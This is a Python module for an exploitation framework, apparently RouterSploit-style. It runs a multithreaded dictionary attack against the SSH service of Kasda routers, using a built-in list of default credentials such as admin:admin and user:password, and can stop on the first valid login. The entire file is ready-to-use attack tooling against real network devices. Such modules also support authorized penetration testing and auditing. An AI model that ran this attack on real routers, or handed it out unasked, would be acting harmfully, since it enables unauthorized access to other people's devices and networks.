# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.ssh_default import Exploit as SSHDefault


class Exploit(SSHDefault):
    __info__ = {
        "name": "Kasda Router Default SSH Creds",
        "description": "Dictionary attack with default credentials against Kasda Router SSH service.",
        "authors": ("André Henrique (@mrhenrike) — EmbedXPL-Forge",),
        "devices": ("Kasda Router",),
    }
    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(22, "Target SSH port")
    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist("admin:admin,admin:password,admin:password or telekomst,user:admin,user:password", "User:Pass or file with default credentials (file://)")
    stop_on_success = OptBool(True, "Stop on first valid attempt")
    verbosity = OptBool(True, "Display attempts")
